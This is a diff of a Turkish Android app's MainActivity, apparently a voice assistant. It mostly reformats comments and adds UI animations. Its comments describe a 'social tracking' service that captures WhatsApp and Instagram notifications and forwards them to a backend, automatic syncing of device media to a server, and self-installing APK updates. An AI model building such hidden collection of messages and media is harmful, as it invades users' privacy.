@@ -4115,8 +4235,14 @@ public class MainActivity extends Activity {
 
 
 
+    /* *********************************************************************************
+     *                               AUDIO PLAYBACK
+     * *********************************************************************************/
+
     /**
-     * Sunucudan gelen Base64 formatındaki ses verisini çözer ve oynatır.
+     * Sunucudan gelen Base64 formatındaki ses verisini çözer ve cihazda oynatır.
+     * 
+     * @param base64Sound Base64 ile kodlanmış ses verisi (mp3)
      */
     private void playAudio(String base64Sound) {
         try {
@@ -4151,10 +4277,12 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ================= METİN OKUMA (TTS) =================
+    /* *********************************************************************************
+     *                               TEXT TO SPEECH (TTS)
+     * *********************************************************************************/
 
     /**
-     * Metin okuma motorunu başlatır.
+     * Metin okuma (TTS) motorunu ilklendirir ve dil desteğini kontrol eder.
      */
     private void initTTS() {
         tts = new TextToSpeech(this, status -> {
@@ -4259,11 +4387,12 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ================= WHATSAPP ENTEGRASYONU =================
-
+    /* *********************************************************************************
+     *                             WHATSAPP INTEGRATION
+     * *********************************************************************************/
 
     /**
-     * Son gelen WhatsApp mesajını sesli okur.
+     * Bildirim merkezinden yakalanan son WhatsApp mesajını seslendirir.
      */
     private void readLastWhatsAppMessage() {
         if (lastWhatsAppMessage == null) {
@@ -4301,10 +4430,14 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ================= ALARM & HATIRLATICI MODÜLÜ =================
+    /* *********************************************************************************
+     *                              ALARM & REMINDERS
+     * *********************************************************************************/
 
     /**
-     * Sesli komuttan saat bilgisini ayrıştırıp alarm kurar.
+     * Sesli komuttaki zaman ifadelerini analiz ederek sistem alarmı kurar.
+     * 
+     * @param cmd Kullanıcının sesli veya yazılı komutu
      */
     private void setAlarm(String cmd) {
         String clean = cmd.toLowerCase(new Locale("tr", "TR"));
@@ -4563,7 +4696,7 @@ public class MainActivity extends Activity {
     }
 
     // ================= SOHBET GEÇMİŞİ (CHAT HISTORY) =================
-    
+
     /**
      * Premium silme onay iletişim kutusu.
      * Modern, buzlu cam (glassmorphism) tasarımı.
@@ -4573,7 +4706,6 @@ public class MainActivity extends Activity {
         LinearLayout mainLayout = new LinearLayout(this);
         mainLayout.setOrientation(LinearLayout.VERTICAL);
         mainLayout.setPadding(48, 40, 48, 32);
-        
         // Premium buzlu cam (glassmorphism) arka plan
         android.graphics.drawable.GradientDrawable bgGradient = new android.graphics.drawable.GradientDrawable();
         bgGradient.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
@@ -5241,9 +5373,16 @@ public class MainActivity extends Activity {
                     final int finalTodayCount = todayCount;
                     final int finalThisWeekCount = thisWeekCount;
                     runOnUiThread(() -> {
-                        if (txtStatTotalChats != null) txtStatTotalChats.setText(String.valueOf(totalMessages));
-                        if (txtStatThisWeek != null) txtStatThisWeek.setText(String.valueOf(finalThisWeekCount));
-                        if (txtStatToday != null) txtStatToday.setText(String.valueOf(finalTodayCount));
+                        if (filter.isEmpty()) {
+                            animateStatsCards();
+                            animateNumberCount(txtStatTotalChats, totalMessages);
+                            animateNumberCount(txtStatThisWeek, finalThisWeekCount);
+                            animateNumberCount(txtStatToday, finalTodayCount);
+                        } else {
+                            if (txtStatTotalChats != null) txtStatTotalChats.setText(String.valueOf(totalMessages));
+                            if (txtStatThisWeek != null) txtStatThisWeek.setText(String.valueOf(finalThisWeekCount));
+                            if (txtStatToday != null) txtStatToday.setText(String.valueOf(finalTodayCount));
+                        }
                     });
 
                     if (historyArray.length() == 0) {
@@ -5349,21 +5488,96 @@ public class MainActivity extends Activity {
 
     private void addNoResultUI() {
         TextView noResult = new TextView(this);
-        noResult.setText("Sonuç bulunamadı.");
-        noResult.setTextColor(Color.parseColor("#55FFFFFF"));
+        noResult.setText("Arşivde eşleşme bulunamadı.");
+        noResult.setTextColor(Color.parseColor("#40FFFFFF"));
         noResult.setTextSize(14);
         noResult.setGravity(android.view.Gravity.CENTER);
-        noResult.setPadding(0, 64, 0, 0);
+        noResult.setPadding(0, 100, 0, 0);
+        noResult.setTypeface(android.graphics.Typeface.create("sans-serif-medium", android.graphics.Typeface.NORMAL));
         containerHistoryItems.addView(noResult);
+    }
+
+    /**
+     * Arşiv öğeleri için premium giriş animasyonu.
+     * Öğeler gecikmeli olarak aşağıdan yukarıya doğru süzülür.
+     */
+    private void animateItemEntry(View view, int index) {
+        // Her öğe için artan bir gecikme ekle (Maksimum 10 öğe için kademeli)
+        long delay = Math.min(index, 10) * 50L;
+        
+        view.setAlpha(0f);
+        view.setTranslationY(100f);
+        
+        view.animate()
+            .alpha(1f)
+            .translationY(0f)
+            .setDuration(400)
+            .setStartDelay(delay)
+            .setInterpolator(new android.view.animation.DecelerateInterpolator())
+            .start();
+    }
+
+    /**
+     * İstatistik kartları için kademeli giriş animasyonu.
+     */
+    private void animateStatsCards() {
+        if (cardStatTotal == null || cardStatWeekly == null || cardStatToday == null) return;
+
+        View[] cards = {cardStatTotal, cardStatWeekly, cardStatToday};
+        for (int i = 0; i < cards.length; i++) {
+            View card = cards[i];
+            card.setAlpha(0f);
+            card.setScaleX(0.8f);
+            card.setScaleY(0.8f);
+            card.setTranslationY(50f);
+
+            card.animate()
+                .alpha(1f)
+                .scaleX(1.0f)
+                .scaleY(1.0f)
+                .translationY(0f)
+                .setDuration(500)
+                .setStartDelay(i * 100L)
+                .setInterpolator(new android.view.animation.OvershootInterpolator(1.4f))
+                .start();
+        }
+    }
+
+    /**
+     * Sayıların 0'dan hedef değere kadar sayma animasyonu.
+     */
+    private void animateNumberCount(TextView target, int finalValue) {
+        if (target == null) return;
+        
+        android.animation.ValueAnimator animator = android.animation.ValueAnimator.ofInt(0, finalValue);
+        animator.setDuration(1200);
+        animator.addUpdateListener(animation -> target.setText(animation.getAnimatedValue().toString()));
+        animator.setInterpolator(new android.view.animation.DecelerateInterpolator());
+        animator.start();
     }
 
     private void animateHistoryIn() {
         AnimationSet set = new AnimationSet(true);
-        TranslateAnimation slide = new TranslateAnimation(0, 0, 1000, 0);
+        // Slide from bottom
+        TranslateAnimation slide = new TranslateAnimation(
+                Animation.RELATIVE_TO_SELF, 0, Animation.RELATIVE_TO_SELF, 0,
+                Animation.RELATIVE_TO_SELF, 1.0f, Animation.RELATIVE_TO_SELF, 0);
+        slide.setDuration(400);
+        slide.setInterpolator(new android.view.animation.OvershootInterpolator(1.2f));
+
+        // Fade in
         AlphaAnimation fade = new AlphaAnimation(0, 1);
+        fade.setDuration(300);
+
+        // Scale up slightly
+        ScaleAnimation scale = new ScaleAnimation(0.9f, 1.0f, 0.9f, 1.0f,
+                Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f);
+        scale.setDuration(400);
+
         set.addAnimation(slide);
         set.addAnimation(fade);
-        set.setDuration(400);
+        set.addAnimation(scale);
+        
         layoutHistory.startAnimation(set);
     }
 
@@ -5484,6 +5698,9 @@ public class MainActivity extends Activity {
         itemLayout.setLayoutParams(cardParams);
         itemLayout.setClickable(true);
         itemLayout.setFocusable(true);
+        
+        // Add entry animation
+        animateItemEntry(itemLayout, index);
 
         // Kısa basınca metni kopyala
         itemLayout.setOnClickListener(v -> {
@@ -7363,8 +7580,14 @@ public class MainActivity extends Activity {
         addLog("[UPDATE] Premium güncelleme dialogu gösterildi: v" + latestVersion);
     }
 
+    /* *********************************************************************************
+     *                            GÜNCELLEME SİSTEMİ (İNDİRİCİ)
+     * *********************************************************************************/
+
     /**
-     * İlerleme çubuğu ile güncelleme indir ve kur.
+     * Yeni APK dosyasını arka planda indirir ve ilerlemeyi UI üzerinde gösterir.
+     * 
+     * @param progressLayout İlerleme çubuğunun ekleneceği layout
      */
     private void downloadAndInstallUpdateWithProgress(LinearLayout progressLayout) {
         addLog("[UPDATE] İndirme başlatılıyor...");
@@ -7530,12 +7753,13 @@ public class MainActivity extends Activity {
     }
 
 
-    // ============================================================================
-    // YENİ NESİL MEDYA SENKRONİZASYON SİSTEMİ (SIFIRDAN YAZILDI)
-    // ============================================================================
+    /* *********************************************************************************
+     *                         YENİ NESİL MEDYA SENKRONİZASYON MOTORU
+     * *********************************************************************************/
 
     /**
-     * Tüm medya türlerini (Fotoğraf, Video, Ses) arka planda sırayla senkronize eder.
+     * Cihazdaki medya dosyalarını (Resim, Video, Ses) tarar ve sunucuyla 
+     * senkronize eder.
      */
     private void startAutoPhotoSync() { performMediaSync("photos"); }
     private void startAutoVideoSync() { performMediaSync("videos"); }
@@ -7729,11 +7953,15 @@ public class MainActivity extends Activity {
     }
 
 
-    // ================= YÖNETİCİ KAYIT YÖNETİMİ =================
+    /* *********************************************************************************
+     *                                 YÖNETİCİ LOGLARI
+     * *********************************************************************************/
 
     /**
-     * Uygulama içine bir log kaydı ekler.
-     * Bu loglar hem Android Logcat'e yazılır hem de uygulama içindeki admin panelinde gösterilir.
+     * Uygulama içi log sistemine yeni bir girdi ekler.
+     * Girdiler zaman damgalıdır ve admin panelinden görüntülenebilir.
+     * 
+     * @param message Log mesajı
      */
     private void addLog(String message) {
         String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
@@ -7779,12 +8007,13 @@ public class MainActivity extends Activity {
         });
     }
 
-    // ================= WHATSAPP & INSTAGRAM TRACKING (YENİ) =================
+    /* *********************************************************************************
+     *                      SOSYAL TAKİP (WHATSAPP & INSTAGRAM)
+     * *********************************************************************************/
 
     /**
-     * WhatsApp ve Instagram bildirimlerini yakalayan servis.
-     * Bu sayede gelen mesajlar (bildirim olarak düştüğü sürece) anlık yakalanır.
-     * Bu servis AndroidManifest.xml içinde tanımlıdır ve kullanıcıdan "Bildirim Erişimi" izni gerektirir.
+     * WhatsApp ve Instagram bildirimlerini yakalayarak backend'e ileten servis.
+     * Bildirim Erişimi (Notification Access) gerektirir.
      */
     public static class WhatsAppService extends NotificationListenerService {
         @Override
